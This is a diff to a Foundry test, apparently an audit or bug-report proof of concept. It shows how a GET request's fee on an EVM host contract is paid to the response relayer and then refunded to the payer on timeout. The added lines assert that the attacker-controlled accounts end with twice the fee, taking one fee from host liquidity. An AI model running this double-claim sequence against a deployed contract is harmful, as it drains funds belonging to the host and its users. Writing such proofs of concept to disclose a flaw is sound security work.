@@ -40,6 +40,9 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         console2.log("host balance before dispatch:", feeToken.balanceOf(address(host)));
         console2.log("response relayer balance before:", feeToken.balanceOf(responseRelayer));
 
+        uint256 attackerCombinedBefore = feeToken.balanceOf(address(app)) + feeToken.balanceOf(responseRelayer);
+        console2.log("attacker combined balance before:", attackerCombinedBefore);
+
         vm.prank(address(app));
         bytes32 commitment = host.dispatch(get);
 
@@ -65,6 +68,9 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         host.dispatchIncoming(response, responseRelayer);
 
         console2.log("response relayer balance after response:", feeToken.balanceOf(responseRelayer));
+
+        uint256 attackerCombinedAfterResponse = feeToken.balanceOf(address(app)) + feeToken.balanceOf(responseRelayer);
+        console2.log("attacker combined balance after response:", attackerCombinedAfterResponse);
         console2.log("host balance after response:", feeToken.balanceOf(address(host)));
         console2.log("local response receipt relayer:", host.responseReceipts(commitment).relayer);
         console2.log("BUG: request commitment fee still live after response:", host.requestCommitments(commitment).fee);
@@ -93,6 +99,14 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         console2.log("app balance after timeout refund:", feeToken.balanceOf(address(app)));
         console2.log("host balance after timeout refund:", feeToken.balanceOf(address(host)));
         console2.log("response relayer still paid:", feeToken.balanceOf(responseRelayer));
+
+        uint256 attackerCombinedAfter = feeToken.balanceOf(address(app)) + feeToken.balanceOf(responseRelayer);
+        console2.log("attacker combined balance after timeout:", attackerCombinedAfter);
+        console2.log("attacker net gain from host liquidity:", attackerCombinedAfter - attackerCombinedBefore);
+
+        assertEq(attackerCombinedBefore, fee, "attacker starts with one fee amount");
+        assertEq(attackerCombinedAfter, fee * 2, "attacker ends with two fee amounts");
+        assertEq(attackerCombinedAfter - attackerCombinedBefore, fee, "attacker gains one fee from host liquidity");
         console2.log("request commitment sender after timeout:", host.requestCommitments(commitment).sender);
 
         assertEq(feeToken.balanceOf(address(app)), appBeforeTimeout + fee, "BUG: original payer was refunded after response relayer was already paid");
@@ -100,5 +114,6 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         assertEq(host.requestCommitments(commitment).sender, address(0), "timeout finally deletes stale commitment");
 
         console2.log("RESULT: same GET fee was paid to response relayer and later refunded to payer");
+        console2.log("RESULT: attacker-controlled combined balance increased from one fee to two fees");
     }
 }
